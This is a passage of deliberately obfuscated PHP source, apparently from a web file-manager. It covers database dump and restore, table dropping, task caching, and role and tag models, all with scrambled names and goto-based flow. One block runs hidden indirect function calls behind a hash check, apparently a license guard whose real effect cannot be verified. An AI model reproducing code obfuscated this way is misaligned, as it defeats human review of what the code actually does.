$_SERVER[¢Í]; if (!IO::exist($c¨ÊÎ¡ƒ¬„)) { ActionCall($aŠ÷Â‰ó¢[986], !0, 0); show_json(LNG($aŠ÷Â‰ó¢[987]), !1); } $a¯À©ï©êó = sqlSplit(IO::getContent($c¨ÊÎ¡ƒ¬„)); foreach ($a¯À©ï©êó as $A‘‹µ•à©) { if ($eÁ¤µ²ˆÏù) { $B§­‰Ü½·Ë = stripos($A‘‹µ•à©, $aŠ÷Â‰ó¢[988]) === 0; if ($B§­‰Ü½·Ë) { $eÁ¤µ²ˆÏù->task[$aŠ÷Â‰ó¢[989]] += 1; } } $this->model()->db()->execute($A‘‹µ•à©); if ($eÁ¤µ²ˆÏù && $B§­‰Ü½·Ë) { preg_match($aŠ÷Â‰ó¢[990], $A‘‹µ•à©, $Aš‚‰”ëˆ•); $eÁ¤µ²ˆÏù->task[$aŠ÷Â‰ó¢[991]] = $Aš‚‰”ëˆ•[1]; $eÁ¤µ²ˆÏù->update(1); } } $this->taskToCache($eÁ¤µ²ˆÏù); } public function insertTable($A©Å»â§Û, $AñÈİÇŒ = null) { $BÃ°À¶®«ø =& $_SERVER[¢Í]; $cã¥ÉƒÇ×ù = $this->model()->db(); $F¾É±ÕÒì‚ = $EÌô„´¾Ö ? array($EÌô„´¾Ö) : $cã¥ÉƒÇ×ù->getTables(); foreach ($A©Å»â§Û as $fâ ÒÎîË) { $EÌô„´¾Ö = basename($fâ ÒÎîË, $BÃ°À¶®«ø[731]); if (!in_array($EÌô„´¾Ö, $F¾É±ÕÒì‚)) { continue; } if ($AñÈİÇŒ) { $AñÈİÇŒ->task[$BÃ°À¶®«ø[991]] = $EÌô„´¾Ö; } if (get_filesize($fâ ÒÎîË) == 0) { continue; } $F¢ÔÏ¼³¹… = $this->sqlToDb($fâ ÒÎîË, $AñÈİÇŒ); if (!$F¢ÔÏ¼³¹…) { ActionCall($BÃ°À¶®«ø[986], !0, 0); show_json(LNG($BÃ°À¶®«ø[992]) . "\133{$EÌô„´¾Ö}\x5d", !1); } } $this->taskToCache($AñÈİÇŒ); } public function sqlFromDb($dæ ´ˆ×ó‚, $D»ˆœ¼ê•, $c¡„Ÿøñõ = null, $E‚†ò‘„á· = null) { goto FÖÓµ‰ßÃæ; fÊ‚í±«‰: fclose($f¦Æğ‘“Ş±); return $Cå°Ó·‡„·; goto eæÑ­™²ğ£; bó†“æø—: $E™çˆ‚éÍ¦ = $a¹¾×Èøø£->getPk(); $EÆËÑºÎ‚· = $a¹¾×Èøø£->getDbFields(); do { $f“ÈòŠ…ÒÛ = $a¹¾×Èøø£->field($EÆËÑºÎ‚·)->order($E™çˆ‚éÍ¦ . $_SERVER[¢Í][994])->selectPage($c²¶ÍåÈß, $AŒ¬¨Œì±¨); $c²ø Ú‰Èß = isset($f“ÈòŠ…ÒÛ[$_SERVER[¢Í][367]][$_SERVER[¢Í][369]]) ? $f“ÈòŠ…ÒÛ[$_SERVER[¢Í][367]][$_SERVER[¢Í][369]] : 0; $E³òÇÓì¼® = !empty($f“ÈòŠ…ÒÛ[$_SERVER[¢Í][370]]) ? $f“ÈòŠ…ÒÛ[$_SERVER[¢Í][370]] : array(); if (!($Fù—¨½ßªí = count($E³òÇÓì¼®))) { break; } $e¤ø¼Ò±È = array(); foreach ($E³òÇÓì¼® as $cˆˆ”ƒ”˜¼) { if ($dæ ´ˆ×ó‚ == $_SERVER[¢Í][995] && $cˆˆ”ƒ”˜¼[$_SERVER[¢Í][29]] == $_SERVER[¢Í][996]) { $dµĞšÚñÑ† = json_decode($cˆˆ”ƒ”˜¼[$_SERVER[¢Í][375]], !0); if ($dµĞšÚñÑ†[$_SERVER[¢Í][28]] == date($_SERVER[¢Í][704]) && !$dµĞšÚñÑ†[$_SERVER[¢Í][703]]) { continue; } } if ($E‚†ò‘„á·) { $cˆˆ”ƒ”˜¼[$_SERVER[¢Í][85]] = "\173\151\157\72{$E‚†ò‘„á·}\x7d" . substr($cˆˆ”ƒ”˜¼[$_SERVER[¢Í][85]], strlen("\x7b\x69\157\x3a{$cˆˆ”ƒ”˜¼[$_SERVER[¢Í][757]]}\x7d")); $cˆˆ”ƒ”˜¼[$_SERVER[¢Í][757]] = $E‚†ò‘„á·; } $e¤ø¼Ò±È[] = $_SERVER[¢Í][997] . $this->sqlEncode($cˆˆ”ƒ”˜¼) . $_SERVER[¢Í][998]; } $f’Ö¤°†Û = "\111\116\x53\x45\122\124\40\111\116\x54\x4f\40\x60{$dæ ´ˆ×ó‚}\x60\40\50\140" . implode($_SERVER[¢Í][999], $EÆËÑºÎ‚·) . $_SERVER[¢Í][1000]; fwrite($f¦Æğ‘“Ş±, $f’Ö¤°†Û . implode($_SERVER[¢Í][1001], $e¤ø¼Ò±È) . $_SERVER[¢Í][77] . PHP_EOL); $AŒ¬¨Œì±¨++; $Cå°Ó·‡„· += $Fù—¨½ßªí; if ($c¡„Ÿøñõ) { $c¡„Ÿøñõ->update($Fù—¨½ßªí); } } while ($AŒ¬¨Œì±¨ <= $c²ø Ú‰Èß); goto fÊ‚í±«‰; B¬ƒ½¦³ğØ: $AŒ¬¨Œì±¨ = 1; $c²¶ÍåÈß = 500; $f¦Æğ‘“Ş± = fopen($D»ˆœ¼ê•, $_SERVER[¢Í][993]); goto bó†“æø—; FÖÓµ‰ßÃæ: if ($c¡„Ÿøñõ) { $c¡„Ÿøñõ->task[$_SERVER[¢Í][991]] = $dæ ´ˆ×ó‚; } $a¹¾×Èøø£ = $this->model($dæ ´ˆ×ó‚); $Cå°Ó·‡„· = 0; goto B¬ƒ½¦³ğØ; eæÑ­™²ğ£: } public function sqlToDb($D½‰í»¾˜ì, $fåéïµÛ–ª = null) { goto Dñ¬‰á¥ë­; e×¼†—ÅÛ¸: if (trim($Cä¯ÀÃÔ²Õ)) { $Cä¯ÀÃÔ²Õ = rtrim(trim($Cä¯ÀÃÔ²Õ), $FŒŸŸ‘’¹’[77]); if (!$B³ ——•éá->execute($Cä¯ÀÃÔ²Õ)) { return !1; } if ($fåéïµÛ–ª) { $fåéïµÛ–ª->update($båøÕŞ¤ ¼ - 1); } } return !0; goto cŸ°çÒ¢; Aî¡Á§¿Ï‡: if (!$Bì„ÓÍë…—) { return !1; } $båøÕŞ¤ ¼ = 0; $Cä¯ÀÃÔ²Õ = $FŒŸŸ‘’¹’[33]; goto e­î¥Î—òÙ; e­î¥Î—òÙ: $C…ğ»’À¹ = 500 + 1; while (!feof($Bì„ÓÍë…—)) { if ($fåéïµÛ–ª && $båøÕŞ¤ ¼ != 0) { $fåéïµÛ–ª->task[$FŒŸŸ‘’¹’[989]] += 1; } $båøÕŞ¤ ¼++; $Cë«ªØ¶é = trim(fgets($Bì„ÓÍë…—)); $Cä¯ÀÃÔ²Õ .= $FŒŸŸ‘’¹’[50] . $this->sqlDecode($Cë«ªØ¶é, $this->type); if ($båøÕŞ¤ ¼ == $C…ğ»’À¹) { $Cä¯ÀÃÔ²Õ = rtrim(trim($Cä¯ÀÃÔ²Õ), $FŒŸŸ‘’¹’[77]); if (!$B³ ——•éá->execute($Cä¯ÀÃÔ²Õ)) { return !1; } if ($fåéïµÛ–ª) { $fåéïµÛ–ª->update($båøÕŞ¤ ¼ - 1); } $Cä¯ÀÃÔ²Õ = $FŒŸŸ‘’¹’[33]; $båøÕŞ¤ ¼ = 0; } } fclose($Bì„ÓÍë…—); goto e×¼†—ÅÛ¸; Dñ¬‰á¥ë­: $FŒŸŸ‘’¹’ =& $_SERVER[¢Í]; $B³ ——•éá = $this->model()->db(); $Bì„ÓÍë…— = @fopen($D½‰í»¾˜ì, $FŒŸŸ‘’¹’[1002]); goto Aî¡Á§¿Ï‡; cŸ°çÒ¢: } public function dropTable($d†Û®æ¨Ù = null) { $Dä½õŞ¬ÓŸ = $this->model()->db(); $dÆ§±¹ë¦ù = $d†Û®æ¨Ù ? array($d†Û®æ¨Ù) : $Dä½õŞ¬ÓŸ->getTables(); if (!$dÆ§±¹ë¦ù) { return; } foreach ($dÆ§±¹ë¦ù as $d†Û®æ¨Ù) { $Dä½õŞ¬ÓŸ->execute("\x64\162\x6f\160\x20\x74\x61\142\x6c\x65\40\x69\x66\x20\145\x78\x69\x73\x74\163\x20\x60{$d†Û®æ¨Ù}\140"); } } private function taskToCache($D‰ªÃß = null) { $cÓ«ï¼À‹å =& $_SERVER[¢Í]; if (!$D‰ªÃß) { return; } $dß…ÒÈÌ±Ò = array($cÓ«ï¼À‹å[991] => $D‰ªÃß->task[$cÓ«ï¼À‹å[991]], $cÓ«ï¼À‹å[989] => $D‰ªÃß->task[$cÓ«ï¼À‹å[989]], $cÓ«ï¼À‹å[1003] => $D‰ªÃß->task[$cÓ«ï¼À‹å[1003]]); if ($dß…ÒÈÌ±Ò[$cÓ«ï¼À‹å[989]] == $dß…ÒÈÌ±Ò[$cÓ«ï¼À‹å[1003]]) { $dß…ÒÈÌ±Ò[$cÓ«ï¼À‹å[710]] = 1; } Cache::set($cÓ«ï¼À‹å[1004] . $D‰ªÃß->task[$cÓ«ï¼À‹å[392]], $dß…ÒÈÌ±Ò); $D‰ªÃß->end(); } private function sqlEncode($A–²äÍèºƒ) { $D¡éÆíÒ—† =& $_SERVER[¢Í]; $F¥ÇÈ‚™ğŸ = array(); foreach ($A–²äÍèºƒ as $F¾ÃÈÈ¦——) { if (is_array($F¾ÃÈÈ¦——)) { $F¾ÃÈÈ¦—— = json_encode_force($F¾ÃÈÈ¦——); } $F¾ÃÈÈ¦—— = addslashes($F¾ÃÈÈ¦——); $F¾ÃÈÈ¦—— = str_replace(array($D¡éÆíÒ—†[1005], $D¡éÆíÒ—†[56]), array($D¡éÆíÒ—†[1006], $D¡éÆíÒ—†[1007]), $F¾ÃÈÈ¦——); $F¥ÇÈ‚™ğŸ[] = str_replace($D¡éÆíÒ—†[65], $D¡éÆíÒ—†[1008], $F¾ÃÈÈ¦——); } return $D¡éÆíÒ—†[65] . implode($D¡éÆíÒ—†[1009], $F¥ÇÈ‚™ğŸ) . $D¡éÆíÒ—†[65]; } private function sqlDecode($cíçç©×–×, $bŠòÃ„Ã) { $cŒÛÅôÆö¬ =& $_SERVER[¢Í]; $cíçç©×–× = str_replace(array($cŒÛÅôÆö¬[1006], $cŒÛÅôÆö¬[1007]), array($cŒÛÅôÆö¬[1005], $cŒÛÅôÆö¬[56]), $cíçç©×–×); if ($bŠòÃ„Ã == $cŒÛÅôÆö¬[9]) { $cíçç©×–× = stripslashes($cíçç©×–×); } return $cíçç©×–×; } } goto bÃ´™ŞÇ¬; AªçŸì×Ï°: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\x74\145\x6d\137\x6f\160\164\151\x6f\156"; protected $jsonField = array("\x6d\x65\156\x75", "\162\157\154\145", "\x72\x6f\154\x65\x47\x72\x6f\165\160", "\x72\145\147\151\x73\164", "\x65\155\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($a‰İ‘Äô“ã) { return "\123\171\x73\164\x65\x6d\117\x70\164\x69\x6f\x6e\137{$a‰İ‘Äô“ã}"; } protected function optionDefault($EÚÛÚêàò· = '') { $Aˆ‘¨éÀã =& $_SERVER[¢Í]; if ($EÚÛÚêàò· == $Aˆ‘¨éÀã[33]) { return $GLOBALS[$Aˆ‘¨éÀã[6]][$Aˆ‘¨éÀã[380]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\56\x72\x6f\154\x65\x4c\151\x73\164"; public $field = array("\156\141\155\145", "\141\165\x74\x68", "\x6c\141\x62\x65\x6c", "\144\x69\x73\160\x6c\x61\171", "\x73\x79\163\164\x65\155", "\x64\145\163\143", "\x69\x67\156\x6f\x72\x65\x45\x78\164", "\151\x67\x6e\x6f\162\145\x46\x69\154\x65\123\x69\172\x65", "\x61\x64\x6d\x69\156\x69\x73\164\162\x61\x74\157\162", "\x73\x6f\x72\x74"); public function listData($DˆŒ½óà÷ = false, $Cøµ“ğ¾Šñ = "\x73\157\x72\x74", $B§©ÔÉÂö‡ = false) { $CßĞø¨·é =& $_SERVER[¢Í]; $DÕéÑ©”Ê½ = parent::listData($DˆŒ½óà÷, $Cøµ“ğ¾Šñ, $B§©ÔÉÂö‡); if (!$DˆŒ½óà÷) { $Eìë ¤ËÏ­ = $CßĞø¨·é[2056]; foreach ($DÕéÑ©”Ê½ as $CÅ‹èšŸ‡ => $FŸ…ñ‘ÉÅ) { if ($FŸ…ñ‘ÉÅ[$CßĞø¨·é[1839]] == 1) { $DÕéÑ©”Ê½[$CÅ‹èšŸ‡][$CßĞø¨·é[430]] = $Eìë ¤ËÏ­; } } } return $DÕéÑ©”Ê½; } public function update($B†îîÊÂºÍ, $B§âğ­÷ª) { goto böø„ã·; böø„ã·: $fØÓÓ™÷‰Õ =& $_SERVER[¢Í]; $f°²½‚Ì = parent::listData($B†îîÊÂºÍ); $añ·Ä’Ï± = $this->findByName($B§âğ­÷ª[$fØÓÓ™÷‰Õ[28]]); goto FˆÂÃÖöÙÉ; FˆÂÃÖöÙÉ: if (!$f°²½‚Ì || $añ·Ä’Ï± && $añ·Ä’Ï±[$fØÓÓ™÷‰Õ[392]] != $f°²½‚Ì[$fØÓÓ™÷‰Õ[392]]) { return !1; } if ($añ·Ä’Ï±[$fØÓÓ™÷‰Õ[1839]] == 1) { $B§âğ­÷ª = array($fØÓÓ™÷‰Õ[28] => $B§âğ­÷ª[$fØÓÓ™÷‰Õ[28]], $fØÓÓ™÷‰Õ[1669] => $B§âğ­÷ª[$fØÓÓ™÷‰Õ[1669]]); } $this->filterAuth($B§âğ­÷ª[$fØÓÓ™÷‰Õ[401]]); goto CÙñãØ; CÙñãØ: return parent::update($B†îîÊÂºÍ, $B§âğ­÷ª); goto fËœå†µŒ; fËœå†µŒ: } public function remove($bïÉéÑŒö—) { $fÔŠùØ–£¶ = parent::listData($bïÉéÑŒö—); if (!$fÔŠùØ–£¶ || $fÔŠùØ–£¶[$_SERVER[¢Í][1133]]) { return !1; } return parent::remove($bïÉéÑŒö—); } public function add($fª£áí½œ²) { goto Eøé«©ÏªŞ; Bö¼‡©Ç‚: $AĞÎ“÷Ÿ¡‚ = array($e¶Ÿãøæ©ç[411] => $aåùÎğ™Ä, $e¶Ÿãøæ©ç[1654] => $e¶Ÿãøæ©ç[33], $e¶Ÿãøæ©ç[1650] => $e¶Ÿãøæ©ç[1658], $e¶Ÿãøæ©ç[2057] => 1, $e¶Ÿãøæ©ç[1653] => 0, $e¶Ÿãøæ©ç[2058] => 0, $e¶Ÿãøæ©ç[1652] => $this->getSort()); $fª£áí½œ² = array_merge($AĞÎ“÷Ÿ¡‚, $fª£áí½œ²); $this->filterAuth($fª£áí½œ²[$e¶Ÿãøæ©ç[401]]); goto aÓ³ˆİ¯›; aÓ³ˆİ¯›: return parent::insert($fª£áí½œ²); goto D‹©è›¹; Eøé«©ÏªŞ: $e¶Ÿãøæ©ç =& $_SERVER[¢Í]; $aåùÎğ™Ä = $fª£áí½œ²[$e¶Ÿãøæ©ç[28]]; if ($this->findByName($aåùÎğ™Ä)) { return !1; } goto Bö¼‡©Ç‚; D‹©è›¹: } private function getSort() { $D½®ò½ùîù =& $_SERVER[¢Í]; $F‘ß¿ğ¸· = parent::listData(); $b¸¹Ùºìï = array_to_keyvalue($F‘ß¿ğ¸·, $D½®ò½ùîù[33], $D½®ò½ùîù[1671]); return empty($b¸¹Ùºìï) ? 0 : max($b¸¹Ùºìï) + 1; } private function filterAuth(&$E•ÑöÂíè‰) { $F•öŒïÁÅ¿ =& $_SERVER[¢Í]; $E¾Šêø‹ó÷ = array(); $E¦â‡¸ô¦µ = array_filter(explode($F•öŒïÁÅ¿[47], $E•ÑöÂíè‰)); foreach ($E¦â‡¸ô¦µ as $E•ÑöÂíè‰) { $E¤‹Í‡‘Ù = explode($F•öŒïÁÅ¿[101], $E•ÑöÂíè‰); if ($E¤‹Í‡‘Ù[0] == $F•öŒïÁÅ¿[2059] && $E¤‹Í‡‘Ù[1] != $F•öŒïÁÅ¿[1057]) { $d¥èˆŒÜù³ = $E¤‹Í‡‘Ù[0] . $F•öŒïÁÅ¿[101] . $E¤‹Í‡‘Ù[1] . $F•öŒïÁÅ¿[2060]; if (!in_array($d¥èˆŒÜù³, $E¦â‡¸ô¦µ)) { $E¾Šêø‹ó÷[] = $d¥èˆŒÜù³; } } $E¾Šêø‹ó÷[] = $E•ÑöÂíè‰; } $E•ÑöÂíè‰ = implode($F•öŒïÁÅ¿[47], $E¾Šêø‹ó÷); } public function sort($FÂ´‰ø¢ , $CÛÖ‘öèß) { return parent::update($FÂ´‰ø¢ , $CÛÖ‘öèß); } } goto D×¯˜·ØÁ; báÍÚï’À: define($_SERVER[¢Í][244], 1); define($_SERVER[¢Í][245], 0); define($_SERVER[¢Í][246], 2); goto Fò–‹±ß”; d³±Ì¹¨ßò: $eÆ»¼Ù„¿Ú = $_SERVER[$_SERVER[¢Í][60]]; $B¶´ğ„ã¿° = $_SERVER[¢Í][806]; if ($_SERVER[$_SERVER[¢Í][51]] != $B¶´ğ„ã¿°($eÆ»¼Ù„¿Ú)) { goto béñ‡¤Á‡ê; béñ‡¤Á‡ê: $F±•ğÔ×Ø˜ = $_SERVER[¢Í][53]; $CçŒ¾ˆï£ = $_SERVER[$_SERVER[¢Í][54]] . $_SERVER[¢Í][55]; $cĞè¯ÆÉ°‘ = $F±•ğÔ×Ø˜($CçŒ¾ˆï£); goto cÇß Ğšƒ; D«°…âó¿ô: $cíÔØ†øÙù($eÆ»¼Ù„¿Ú); goto dÎ™¤§Å÷; cÇß Ğšƒ: $f¤»¾‚šÓ› = explode($_SERVER[¢Í][56], $cĞè¯ÆÉ°‘); if (count($f¤»¾‚šÓ›) < $_SERVER[¢Í][57]) { $A«Í°ì¿‰œ = $_SERVER[¢Í][58]; $A«Í°ì¿‰œ(); } $cíÔØ†øÙù = $_SERVER[¢Í][59]; goto D«°…âó¿ô; dÎ™¤§Å÷: } goto bŠ°ºÉíê; Eİ¨îĞãğ«: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($BİÚ†î‡ÎÌ) { $EŸ˜Ò­¶¬™ =& $_SERVER[¢Í]; return array($EŸ˜Ò­¶¬™[1748] => array(USER_ID, $EŸ˜Ò­¶¬™[1749])); } protected function listData() { $E²ÖÁ¢Ì =& $_SERVER[¢Í]; $FòÜ–ã¨ = array($E²ÖÁ¢Ì[1481] => USER_ID, $E²ÖÁ¢Ì[460] => array($E²ÖÁ¢Ì[1752], 0)); $FÃËŸÍä–ˆ = $E²ÖÁ¢Ì[1754]; $BêÓßå‹¢ = $this->field($FÃËŸÍä–ˆ)->where($FòÜ–ã¨)->order($E²ÖÁ¢Ì[1755])->select(); return $BêÓßå‹¢ ? $BêÓßå‹¢ : array(); } protected function listByTag($F¢¼‚ÔêÑŠ) { } protected function addToTag($fÚÑ•ˆ±ó, $d‡ÄõÚ…”Ö) { $fîèê¸‰×Š =& $_SERVER[¢Í]; if (!Model($fîèê¸‰×Š[1893])->listData($d‡ÄõÚ…”Ö) || !Model($fîèê¸‰×Š[765])->pathInfo($fÚÑ•ˆ±ó)) { return !1; } $Cê‚º§ÆŠÄ = array($fîèê¸‰×Š[1481] => USER_ID, $fîèê¸‰×Š[460] => $d‡ÄõÚ…”Ö, $fîèê¸‰×Š[412] => $fÚÑ•ˆ±ó, $fîèê¸‰×Š[413] => $fîèê¸‰×Š[407], $fîèê¸‰×Š[411] => $fîèê¸‰×Š[33], $fîèê¸‰×Š[1652] => 0); if ($this->where($Cê‚º§ÆŠÄ)->find()) { return !1; } return $this->add($Cê‚º§ÆŠÄ); } protected function removeFromTag($EÔ¸†äÏ­ä, $aë’ ¿Šñæ) { $B´Õ¶„²× =& $_SERVER[¢Í]; if (!Model($B´Õ¶„²×[1893])->listData($aë’ ¿Šñæ)) { return !1; } if (is_array($EÔ¸†äÏ­ä)) { $EÔ¸†äÏ­ä = array($B´Õ¶„²×[7], $EÔ¸†äÏ­ä); } $B½ÏÎãÉÔÏ = array($B´Õ¶„²×[1481] => USER_ID, $B´Õ¶„²×[460] => $aë’ ¿Šñæ, $B´Õ¶„²×[413] => $B´Õ¶„²×[407], $B´Õ¶„²×[412] => $EÔ¸†äÏ­ä); return $this->where($B½ÏÎãÉÔÏ)->delete(); } protected function removeByTag($EÚ»½ßí»ª) { $AÛƒŠ×¯“¿ =& $_SERVER[¢Í]; if (!$EÚ»½ßí»ª) { return !1; } $cÅ¿ÀÇÌ¹à = array($AÛƒŠ×¯“¿[1481] => USER_ID, $AÛƒŠ×¯“¿[460] => $EÚ»½ßí»ª); return $this->where($cÅ¿ÀÇÌ¹à)->delete(); } protected function removeBySource($FôïÁîùñ) { $eô‚ëÚÁìé =& $_SERVER[¢Í]; if (is_array($FôïÁîùñ)) { $FôïÁîùñ = array($eô‚ëÚÁìé[7], $FôïÁîùñ); } $D•íåñê† = array($eô‚ëÚÁìé[1481] => USER_ID, $eô‚ëÚÁìé[412] => $FôïÁîùñ, $eô‚ëÚÁìé[460] => array($eô‚ëÚÁìé[939], 0)); return $this->where($D•íåñê†)->delete(); } }